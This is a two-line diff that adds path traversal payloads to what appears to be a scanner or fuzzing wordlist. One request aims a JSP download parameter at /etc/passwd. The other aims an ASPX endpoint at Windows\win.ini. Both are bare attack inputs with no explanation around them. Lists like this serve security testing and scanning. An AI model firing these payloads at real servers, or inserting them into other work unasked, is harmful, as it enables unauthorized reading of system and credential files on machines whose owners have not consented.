@@ -1,0 +1,2 @@
+/jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd
+/XmlPeek.aspx?dt=\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\Windows\\\\win.ini&x=/validate.ashx?requri
